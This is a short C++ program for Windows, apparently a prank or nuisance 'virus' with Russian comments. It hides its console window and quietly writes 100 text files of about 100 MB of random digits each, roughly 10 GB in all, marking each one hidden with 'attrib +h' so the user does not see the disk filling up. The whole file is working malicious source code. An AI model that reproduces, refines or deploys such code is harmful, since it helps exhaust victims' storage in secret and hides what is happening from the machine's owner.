#include<iostream>
#include<fstream>
#include <string>
#include "windows.h"
using namespace std;


void main()
{
	system("COLOR 0A");
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	int number_of_files = 100;
	int file_size = 100000000;
	string file_name = "virusdata";
	for (int i = 0; i < number_of_files; i++)
	{
		ofstream fout;
		fout.open(file_name + ".txt");
		string comand = "attrib +h " + file_name + ".txt"; //сокрытие файлов
		system(comand.c_str());
		//цикл который записывает в файл
		//file_size случайных символов
		for (int i = 0; i < file_size; i++)
		{
			fout << rand() % 10;
		}
		fout.close();
		//код который меняет одну букву ot 65 do 90
		char symb = 65 + rand() % 25;
		file_name.push_back(symb);
		file_name.erase(file_name.begin() + 0);
	}





}